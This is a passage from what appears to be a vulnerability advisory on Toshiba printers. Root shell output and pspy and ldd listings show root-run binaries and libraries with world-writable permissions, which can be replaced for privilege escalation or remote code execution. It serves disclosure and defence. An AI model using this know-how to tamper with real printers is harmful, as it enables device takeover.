<li>/home/SYSROM_SRC/build/release/bin/allld2d</li>
<li>/home/SYSROM_SRC/build/release/bin/alLogmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alLogRetriever</li>
<li>/home/SYSROM_SRC/build/release/bin/allprng</li>
<li>/home/SYSROM_SRC/build/release/bin/almailboxapplication</li>
<li>/home/SYSROM_SRC/build/release/bin/almaintenanceplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alnetefiRemoteifsr</li>
<li>/home/SYSROM_SRC/build/release/bin/alnfcplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alnsm</li>
<li>/home/SYSROM_SRC/build/release/bin/alpanel</li>
<li>/home/SYSROM_SRC/build/release/bin/alPanelStartLEDHandler</li>
<li>/home/SYSROM_SRC/build/release/bin/alPanelUIMessageHandler</li>
<li>/home/SYSROM_SRC/build/release/bin/alpdlfiltermanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alpresentationresourcemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alprintmn</li>
<li>/home/SYSROM_SRC/build/release/bin/alreportmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alreportsmsgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alrestrictionmode</li>
<li>/home/SYSROM_SRC/build/release/bin/alrolemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alsecurityconfiguration</li>
<li>/home/SYSROM_SRC/build/release/bin/alServiceUIPlugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alsharedprintDp</li>
<li>/home/SYSROM_SRC/build/release/bin/alsoftwareupdateclient</li>
<li>/home/SYSROM_SRC/build/release/bin/alstage2</li>
<li>/home/SYSROM_SRC/build/release/bin/alUiFrameWork</li>
<li>/home/SYSROM_SRC/build/release/bin/alulm</li>
<li>/home/SYSROM_SRC/build/release/bin/alusbmscapplication</li>
<li>/home/SYSROM_SRC/build/release/bin/alusbPrint</li>
<li>/home/SYSROM_SRC/build/release/bin/aluserAuthMgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alusermgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alViewPlugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsdiscovery</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsmex</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsprint</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsscanner</li>
<li>/home/SYSROM_SRC/build/release/bin/armn</li>
<li>/home/SYSROM_SRC/build/release/bin/cipollproc</li>
<li>/home/SYSROM_SRC/build/release/bin/ciprioritymanager</li>
<li>/home/SYSROM_SRC/build/release/bin/cischeduler</li>
<li>/home/SYSROM_SRC/build/release/bin/cissm</li>
<li>/home/SYSROM_SRC/build/release/bin/cisystemresourcemanager</li>
<li>/home/SYSROM_SRC/build/release/bin/cpe</li>
<li>/home/SYSROM_SRC/build/release/bin/de_ipfax</li>
<li>/home/SYSROM_SRC/build/release/bin/dem</li>
<li>/home/SYSROM_SRC/build/release/bin/dim</li>
<li>/home/SYSROM_SRC/build/release/bin/ebx_dl</li>
<li>/home/SYSROM_SRC/build/release/bin/faxmilter</li>
<li>/home/SYSROM_SRC/build/release/bin/informationservice</li>
<li>/home/SYSROM_SRC/build/release/bin/notificationservice</li>
<li>/home/SYSROM_SRC/build/release/bin/pipeMN</li>
<li>/home/SYSROM_SRC/build/release/bin/sim</li>
<li>/home/SYSROM_SRC/build/release/bin/sljobmanagement</li>
<li>/home/SYSROM_SRC/build/release/bin/snmp_watchdog</li>
<li>/home/SYSROM_SRC/build/release/bin/ssdktimestamp</li>
<li>/home/SYSROM_SRC/build/release/bin/wfpc</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/alipp</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/dibbler-client</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/mDNSResponderPosix</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/nqcs</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/nqnd</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/python3.5</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/vsftpd</li>
<li>/home/SYSROM_SRC/build/thirdparty/libexec/slapd</li>
<li>/home/SYSROM_SRC/build/thirdparty/sbin/snmpd</li>
<li>/usr/local/ebx/bin/httpd</li>
<li>/usr/local/ebx/httpd_worker/bin/httpd_worker</li>
</ul>
<p>The analysis is shown below.</p>
<p>Vulnerable programs running as root, with insecure permissions:</p>
<pre>
bash-4.1# for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
<font color=red>-rwxrwxrwx 1 root root 562669 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_faxreceive
-rwxrwxrwx 1 root root 608397 Dec  6 04:11 /home/SYSROM_SRC/build/release/bin/agent_faxtransmit
-rwxrwxrwx 1 root root 561916 Dec  6 04:38 /home/SYSROM_SRC/build/release/bin/agent_ipfaxreceive
-rwxrwxrwx 1 root root 594505 Dec  6 04:38 /home/SYSROM_SRC/build/release/bin/agent_ipfaxtransmit
-rwxrwxrwx 1 root root 572434 Dec  6 04:11 /home/SYSROM_SRC/build/release/bin/agent_print
-rwxrwxrwx 1 root root 556369 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_rip
-rwxrwxrwx 1 root root 557372 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_scan
-rwxrwxrwx 1 root root 2191621 Dec  6 02:13 /home/SYSROM_SRC/build/release/bin/alAddressBookMgr
-rwxrwxrwx 1 root root 939045 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alCloning
-rwxrwxrwx 1 root root 1019576 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alExportImport
-rwxrwxrwx 1 root root 1354094 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/alLogRetriever
-rwxrwxrwx 1 root root 734343 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alLogmanager
-rwxrwxrwx 1 root root 241886 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alPanelStartLEDHandler
-rwxrwxrwx 1 root root 2282226 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alPanelUIMessageHandler
-rwxrwxrwx 1 root root 211250 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alServiceUIPlugin
-rwxrwxrwx 1 root root 6104526 Dec  6 03:51 /home/SYSROM_SRC/build/release/bin/alUiFrameWork
-rwxrwxrwx 1 root root 673942 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alViewPlugin
-rwxrwxrwx 1 root root 2896387 Dec  6 02:12 /home/SYSROM_SRC/build/release/bin/alaccountmgr
-rwxrwxrwx 1 root root 2917038 Dec  6 02:26 /home/SYSROM_SRC/build/release/bin/alappmanager
-rwxrwxrwx 1 root root 1055271 Dec  6 01:49 /home/SYSROM_SRC/build/release/bin/alboserver
-rwxrwxrwx 1 root root 322981 Dec  6 02:08 /home/SYSROM_SRC/build/release/bin/alcbamanager
-rwxrwxrwx 1 root root 2528851 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/aldevauthmgmtplugin
-rwxrwxrwx 1 root root 4386856 Dec  6 03:30 /home/SYSROM_SRC/build/release/bin/aldeviceconfigplugin
-rwxrwxrwx 1 root root 4300169 Dec  6 03:25 /home/SYSROM_SRC/build/release/bin/aldeviceserviceplugin
-rwxrwxrwx 1 root root 1915456 Dec  6 02:14 /home/SYSROM_SRC/build/release/bin/aleFilingmgr
-rwxrwxrwx 1 root root 580229 Dec  6 01:50 /home/SYSROM_SRC/build/release/bin/alfilestoragem
-rwxrwxrwx 1 root root 509900 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/algrpmgr
-rwxrwxrwx 1 root root 441641 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alhddalertmgr
-rwxrwxrwx 1 root root 696894 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alhddbackuprestore
-rwxrwxrwx 1 root root 829606 Dec  6 02:16 /home/SYSROM_SRC/build/release/bin/alhomedatamgr
-rwxrwxrwx 1 root root 606628 Dec  6 03:28 /home/SYSROM_SRC/build/release/bin/alifaxreceive
-rwxrwxrwx 1 root root 162074 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alintegritychkmgr
-rwxrwxrwx 1 root root 4414769 Dec  6 02:08 /home/SYSROM_SRC/build/release/bin/aljobcontroller
-rwxrwxrwx 1 root root 2832921 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/aljobtemplatemgr
-rwxrwxrwx 1 root root 434559 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/allicensemgmt
-rwxrwxrwx 1 root root 1258130 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/almailboxapplication
-rwxrwxrwx 1 root root 4674491 Dec  6 03:32 /home/SYSROM_SRC/build/release/bin/almaintenanceplugin
-rwxrwxrwx 1 root root 2339610 Dec  6 02:25 /home/SYSROM_SRC/build/release/bin/alnfcplugin
-rwxrwxrwx 1 root root 743285 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alnsm
-rwxrwxrwx 1 root root 740586 Dec  6 03:45 /home/SYSROM_SRC/build/release/bin/alpanel
-rwxrwxrwx 1 root root 292667 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alpdlfiltermanager
-rwxrwxrwx 1 root root 387749 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alpresentationresourcemgr
-rwxrwxrwx 1 root root 1314049 Dec  6 01:52 /home/SYSROM_SRC/build/release/bin/alprintmn
-rwxrwxrwx 1 root root 2360596 Dec  6 03:22 /home/SYSROM_SRC/build/release/bin/alreportmanager
-rwxrwxrwx 1 root root 595735 Dec  6 03:21 /home/SYSROM_SRC/build/release/bin/alreportsmsgr
-rwxrwxrwx 1 root root 1367678 Dec  6 02:19 /home/SYSROM_SRC/build/release/bin/alrestrictionmode
-rwxrwxrwx 1 root root 1253012 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alrolemgr
-rwxrwxrwx 1 root root 2272202 Dec  6 02:18 /home/SYSROM_SRC/build/release/bin/alsecurityconfiguration
-rwxrwxrwx 1 root root 972621 Dec  6 03:52 /home/SYSROM_SRC/build/release/bin/alsharedprintDp
-rwxrwxrwx 1 root root 1060254 Dec  6 02:13 /home/SYSROM_SRC/build/release/bin/alsoftwareupdateclient
-rwxrwxrwx 1 root root 1711439 Dec  6 02:25 /home/SYSROM_SRC/build/release/bin/alulm
-rwxrwxrwx 1 root root 612467 Dec  6 02:18 /home/SYSROM_SRC/build/release/bin/alusbmscapplication
-rwxrwxrwx 1 root root 3759736 Dec  6 02:17 /home/SYSROM_SRC/build/release/bin/aluserAuthMgr
-rwxrwxrwx 1 root root 2874311 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alusermgr
-rwxrwxrwx 1 root root 899734 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alwsdiscovery
-rwxrwxrwx 1 root root 809391 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alwsmex
-rwxrwxrwx 1 root root 3782642 Dec  6 01:55 /home/SYSROM_SRC/build/release/bin/alwsprint
-rwxrwxrwx 1 root root 4271522 Dec  6 01:56 /home/SYSROM_SRC/build/release/bin/alwsscanner
-rwxrwxrwx 1 root root 355919 Dec  6 03:53 /home/SYSROM_SRC/build/release/bin/armn
-rwxrwxrwx 1 root root 18113 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cipollproc
-rwxrwxrwx 1 root root 71587 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/ciprioritymanager
-rwxrwxrwx 1 root root 445362 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cischeduler
-rwxrwxrwx 1 root root 532898 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cissm
-rwxrwxrwx 1 root root 508004 Dec  6 01:48 /home/SYSROM_SRC/build/release/bin/cisystemresourcemanager
-rwxrwxrwx 1 root root 501163 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/cpe
-rwxrwxrwx 1 root root 1016124 Dec  6 04:39 /home/SYSROM_SRC/build/release/bin/de_ipfax
-rwxrwxrwx 1 root root 303779 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/dem
-rwxrwxrwx 1 root root 622110 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/dim
-rwxrwxrwx 1 root root 12229927 Dec  6 04:44 /home/SYSROM_SRC/build/release/bin/ebx_dl
-rwxrwxrwx 1 root root 1649127 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/informationservice
-rwxrwxrwx 1 root root 1257189 Dec  6 04:01 /home/SYSROM_SRC/build/release/bin/notificationservice
-rwxrwxrwx 1 root root 426167 Dec  6 04:14 /home/SYSROM_SRC/build/release/bin/pipeMN
-rwxrwxrwx 1 root root 269419 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/sim
-rwxrwxrwx 1 root root 258577 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/sljobmanagement
-rwxrwxrwx 1 root root 32089 Mar 14 16:28 /home/SYSROM_SRC/build/release/bin/ssdktimestamp
-rwxrwxrwx 1 root root 5986687 Dec  6 04:07 /home/SYSROM_SRC/build/release/bin/wfpc
-rwxrwxrwx 1 root root 78627 Dec  6 02:00 /home/SYSROM_SRC/bin/alllmnr
-rwxrwxrwx 1 root root 68223 Dec  6 01:57 /home/SYSROM_SRC/bin/dnsValidateDaemon
-rwxrwxrwx 1 root root 104184 Dec  6 01:48 /home/SYSROM_SRC/bin/eBXDebugLogUtility
-rwxrwxrwx 1 root root 76674 Dec  6 02:01 /home/SYSROM_SRC/bin/ipv6_daemon
-rwxrwxrwx 1 root root 28318 Dec  6 01:40 /home/SYSROM_SRC/bin/mapper
-rwxrwxrwx 1 root root 167219 Dec  6 01:48 /home/SYSROM_SRC/bin/syscallerr
-rwxrwxrwx 1 root root 316382 Dec  6 02:03 /home/SYSROM_SRC/build/release/bin/aleSCL
-rwxrwxrwx 1 root root 21142 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/alftpprintd
-rwxrwxrwx 1 root root 243145 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alhp9100
-rwxrwxrwx 1 root root 84257 Dec  6 01:56 /home/SYSROM_SRC/build/release/bin/allld2d
-rwxrwxrwx 1 root root 270934 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/allprng
-rwxrwxrwx 1 root root 389522 Dec  6 02:02 /home/SYSROM_SRC/build/release/bin/alnetefiRemoteifsr
-rwxrwxrwx 1 root root 15176259 Dec  6 03:39 /home/SYSROM_SRC/build/release/bin/alstage2
-rwxrwxrwx 1 root root 126466 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/alusbPrint
-rwxrwxrwx 1 root root 1419229 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/faxmilter
-rwxrwxrwx 1 root root 21638 Dec  6 03:28 /home/SYSROM_SRC/build/release/bin/snmp_watchdog
-rwxrwxrwx 1 apache messagebus 656546 Dec  6 01:34 /usr/local/ebx/bin/httpd
-rwxrwxrwx 1 apache messagebus 665612 Dec  6 01:34 /usr/local/ebx/httpd_worker/bin/httpd_worker</font>
</pre>

<p>The previous command lists symbolic links that we can analyze, and we can confirm they are also vulnerable due to insecure permissions:</p>
<pre>
lrwxrwxrwx 1 root root 35 Mar 14 16:27 /home/SYSROM_SRC/bin/dibbler-client -> ../../thirdparty/bin/dibbler-client
lrwxrwxrwx 1 root root 26 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/alipp -> ../../thirdparty/bin/alipp
lrwxrwxrwx 1 root root 39 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/mDNSResponderPosix -> ../../thirdparty/bin/mDNSResponderPosix
lrwxrwxrwx 1 root root 25 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/nqcs -> ../../thirdparty/bin/nqcs
lrwxrwxrwx 1 root root 25 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/nqnd -> ../../thirdparty/bin/nqnd
lrwxrwxrwx 1 root root 30 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/slapd -> ../../thirdparty/libexec/slapd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/snmpd -> ../../thirdparty/sbin/snmpd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/vsftpd -> ../../thirdparty/bin/vsftpd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/python -> ../../thirdparty/bin/python

bash-4.1# for i in dibbler-client alipp mDNSResponderPosix nqcs nqnd vsftpd python; do ls -la /home/SYSROM_SRC/build/thirdparty/bin/$i;done
<font color=red>-rwxrwxrwx 1 root root 11339780 Dec  6 01:38 /home/SYSROM_SRC/build/thirdparty/bin/dibbler-client
-rwxrwxrwx 1 apache messagebus 653763 Dec  6 01:40 /home/SYSROM_SRC/build/thirdparty/bin/alipp
-rwxrwxrwx 1 root root 429709 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/bin/mDNSResponderPosix
-rwxrwxrwx 1 apache messagebus 1342015 Dec  6 01:35 /home/SYSROM_SRC/build/thirdparty/bin/nqcs
-rwxrwxrwx 1 apache messagebus 501752 Dec  6 01:35 /home/SYSROM_SRC/build/thirdparty/bin/nqnd
-rwxrwxrwx 1 root root 232030 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/bin/vsftpd</font>
lrwxrwxrwx 1 root root 7 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/python -> python3
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/libexec/slapd
<font color=red>-rwxrwxrwx 1 root root 1709140 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/libexec/slapd</font>
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/sbin/snmpd
<font color=red>-rwxrwxrwx 1 apache messagebus 41801 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/sbin/snmpd</font>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/python3
lrwxrwxrwx 1 root root 28 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/python3 -> ../../thirdparty/bin/python3
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/python3
lrwxrwxrwx 1 root root 9 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/python3 -> python3.5
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/python3.5
<font color=red>-rwxrwxrwx 1 root root 20997 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/bin/python3.5</font>
bash-4.1#
</pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The programs can be replaced by malicious programs by any local or remote attacker.</p>
<p><a id="lpe-rce-libs"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure permissions for libraries</h2>
<p>Some vendor-specific programs are running inside Toshiba printers. These programs run as root and use code from libraries that have insecure permissions (777) allowing an attacker to replace these libraries with malicious ones. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>For example, the <code>/home/SYSROM_SRC/bin/syscallerr</code> program runs regularly as root:</p>
<p><a id="lpe-rce-syscallerr"></a></p>
<h3>Example with <code>/home/SYSROM_SRC/bin/syscallerr</code>:</h3>
<p>Output of <code>pspy32</code>, where we can see <code>/home/SYSROM_SRC/bin/syscallerr</code> running regularly as root:</p>
<pre>
2023/05/27  16:13:35 CMD: UID=0     PID=31370  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31373  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31372  | grep total
2023/05/27  16:13:35 CMD: UID=0     PID=31371  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31374  | /home/SYSROM_SRC/bin/syscallerr
2023/05/27  16:13:35 CMD: UID=0     PID=31376  | awk {print}
2023/05/27  16:13:35 CMD: UID=0     PID=31375  |
2023/05/27  16:13:35 CMD: UID=0     PID=31377  | sh -c ps -e | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31379  | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31378  | ps -e
<font color=red>2023/05/27  16:13:35 CMD: UID=0     PID=31380  | /home/SYSROM_SRC/bin/syscallerr</font>
2023/05/27  16:13:35 CMD: UID=0     PID=31383  | sh -c ps -e | grep ebx_dl | awk '{print $5}'
2023/05/27  16:13:35 CMD: UID=0     PID=31382  |
2023/05/27  16:13:35 CMD: UID=0     PID=31381  | ps -e
2023/05/27  16:13:35 CMD: UID=0     PID=31384  | sh -c ps -e | grep cissm
2023/05/27  16:13:35 CMD: UID=0     PID=31386  | grep cissm
2023/05/27  16:13:35 CMD: UID=0     PID=31385  | ps -e
2023/05/27  16:13:35 CMD: UID=0     PID=31387  | sh -c dd if=/dev/mtdblock1 of=/ramdisk/FROM_SERIAL > /dev/null 2>&1
2023/05/27  16:13:35 CMD: UID=0     PID=31388  | dd if=/dev/mtdblock1 of=/ramdisk/FROM_SERIAL
2023/05/27  16:13:35 CMD: UID=0     PID=31389  | sh -c ps -e | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31391  | grep ebx_dl
</pre>

<p>When analyzing this program, we can find several shared libraries that will be loaded - their code will be executed as root.</p>
<p>We can find the previously vulnerable shared libraries defined with LD_PRELOAD:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>We can also find several libraries that are being loaded:</p>
<pre><code>bash-4.1# ldd /home/SYSROM_SRC/bin/syscallerr
        linux-gate.so.1 =&gt;  (0x777c0000)
        /ramdisk/al/libGetNameInfoInterface.so (0x777b1000)
        /ramdisk/al/libGetAddtInfoInterface.so (0x777a0000)
        libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x77780000)
        libsqlite3.so.0 =&gt; /usr/lib/libsqlite3.so.0 (0x4be4c000)
        libciindexeddb.so =&gt; /home/SYSROM_SRC/build/release/lib/libciindexeddb.so (0x77729000)
        libsyscallerr.so =&gt; /home/SYSROM_SRC/build/release/lib/libsyscallerr.so (0x77720000)
        libcios.so =&gt; /home/SYSROM_SRC/build/release/lib/libcios.so (0x776ad000)
        libatawrapper.so.0 =&gt; /mfp/lib/libatawrapper.so.0 (0x7768b000)
        libmfpcommonwrapper.so.0 =&gt; /mfp/lib/libmfpcommonwrapper.so.0 (0x77682000)
        libcrypto.so.1.0.0 =&gt; /home/SYSROM_SRC/build/release/lib/libcrypto.so.1.0.0 (0x77420000)
        libstdc++.so.6 =&gt; /usr/lib/libstdc++.so.6 (0x4c04f000)
        libgcc_s.so.1 =&gt; /lib/libgcc_s.so.1 (0x4c14b000)
        libintlc.so.5 =&gt; /usr/lib/libintlc.so.5 (0x773c3000)
        libsvml.so =&gt; /mfp/lib/libsvml.so (0x76ba9000)
        libc.so.6 =&gt; /lib/libc.so.6 (0x4bc67000)
        libdl.so.2 =&gt; /lib/libdl.so.2 (0x4bdaf000)
        libllmnrclient.so =&gt; /home/SYSROM_SRC/build/release/lib/libllmnrclient.so (0x76b95000)
        /lib/ld-linux.so.2 (0x4bc47000)
        libsqlite.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libsqlite.so.0 (0x76b35000)
        libcpanel.so.0 =&gt; /mfp/lib/libcpanel.so.0 (0x76b0e000)
        libcimsg.so =&gt; /home/SYSROM_SRC/build/release/lib/libcimsg.so (0x76b02000)
        libcissmclient.so =&gt; /home/SYSROM_SRC/build/release/lib/libcissmclient.so (0x76ae8000)
        libacl.so.1 =&gt; /lib/libacl.so.1 (0x4bdd7000)
        librt.so.1 =&gt; /lib/librt.so.1 (0x4be15000)
        libm.so.6 =&gt; /lib/libm.so.6 (0x76abf000)
        libssdk.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libssdk.so.0 (0x75f1e000)
        libcihdb.so =&gt; /home/SYSROM_SRC/build/release/lib/libcihdb.so (0x75e56000)
        libattr.so.1 =&gt; /lib/libattr.so.1 (0x4bdd0000)
        libpam.so.0 =&gt; /lib/libpam.so.0 (0x75e4a000)
        libldap-2.4.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libldap-2.4.so.2 (0x75e12000)
        libssl.so.1.0.0 =&gt; /home/SYSROM_SRC/build/release/lib/libssl.so.1.0.0 (0x75da6000)
        libk5crypto.so.3 =&gt; /usr/lib/libk5crypto.so.3 (0x75d84000)
        libresolv.so.2 =&gt; /lib/libresolv.so.2 (0x4c164000)
        libext2fs.so.2 =&gt; /usr/lib/libext2fs.so.2 (0x75d5a000)
        libuuid.so.1 =&gt; /usr/lib/libuuid.so.1 (0x4be0f000)
        libkrb5support.so.0 =&gt; /usr/lib/libkrb5support.so.0 (0x75d53000)
        libkrb5.so.25 =&gt; /home/SYSROM_SRC/build/release/lib/libkrb5.so.25 (0x75ce2000)
        libgssapi.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libgssapi.so.2 (0x75cae000)
        libCryptolib.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libCryptolib.so.0 (0x75c2b000)
        libirng.so =&gt; /usr/lib/libirng.so (0x75c22000)
        libcilkrts.so.5 =&gt; /usr/lib/libcilkrts.so.5 (0x75bee000)
        libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x4c403000)
        libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x75bbc000)
        liblber-2.4.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/liblber-2.4.so.2 (0x75bb0000)
        libsasl2.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libsasl2.so.2 (0x75b8c000)
        libcom_err.so.2 =&gt; /usr/lib/libcom_err.so.2 (0x4bdee000)
        libhx509.so.5 =&gt; /home/SYSROM_SRC/build/release/lib/libhx509.so.5 (0x75b4b000)
        libheimsqlite.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libheimsqlite.so.0 (0x75ad7000)
        libhcrypto.so.4 =&gt; /home/SYSROM_SRC/build/release/lib/libhcrypto.so.4 (0x75aa4000)
        libasn1.so.8 =&gt; /home/SYSROM_SRC/build/release/lib/libasn1.so.8 (0x75a02000)
        libwind.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libwind.so.0 (0x759da000)
        libcom_err.so.1 =&gt; /home/SYSROM_SRC/build/release/lib/libcom_err.so.1 (0x759d6000)
        libroken.so.18 =&gt; /home/SYSROM_SRC/build/release/lib/libroken.so.18 (0x759c2000)
        libheimntlm.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libheimntlm.so.0 (0x759bc000)
bash-4.1#
</code></pre>
<p>We can find these 31 insecure libraries:</p>
<ul>
<li>/home/SYSROM_SRC/build/release/lib/libciindexeddb.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libsyscallerr.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcios.so.0</li>
<li>/mfp/lib/libatawrapper.so.0.0</li>
<li>/mfp/lib/libmfpcommonwrapper.so.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libcrypto.so.1.0.0</li>
<li>/mfp/lib/libsvml.so</li>
<li>/home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6</li>
<li>/mfp/lib/libcpanel.so.0.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcimsg.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6</li>
<li>/home/SYSROM_SRC/build/release/lib/libcimsg.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcissmclient.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcihdb.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libgssapi.so.2.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/liblber-2.4.so.2.5.6</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libheimntlm.so.0.1.0</li>
